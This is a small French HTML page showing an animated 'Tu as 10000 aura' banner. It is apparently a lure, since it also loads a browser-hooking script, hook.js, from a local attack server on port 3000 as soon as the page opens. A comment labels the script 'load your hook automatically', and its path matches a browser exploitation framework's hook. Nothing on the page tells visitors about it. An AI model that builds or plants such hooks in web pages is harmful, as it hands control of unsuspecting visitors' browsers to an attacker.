<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aura</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #050505;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

.aura {
    font-size: 5rem;
    font-weight: bold;
    color: #fff;
    position: relative;
    text-shadow:
        0 0 10px #fff,
        0 0 20px #fff,
        0 0 40px gold,
        0 0 80px gold;
}

.aura::after {
    content: "";
    position: absolute;
    top: 0;
    left: -150%;
    width: 50%;
    height: 100%;
    background: linear-gradient(
        90deg,
        transparent,
        rgba(255,255,255,0.9),
        transparent
    );
    transform: skewX(-20deg);
    animation: shine 2s infinite;
}

@keyframes shine {
    from {
        left: -150%;
    }
    to {
        left: 250%;
    }
}
</style>
</head>
<body>

<div class="aura">Tu as 10000 aura</div>

<!-- Charge ton hook automatiquement -->
<script src="http://127.0.0.1:3000/hook.js"></script>

</body>
</html>
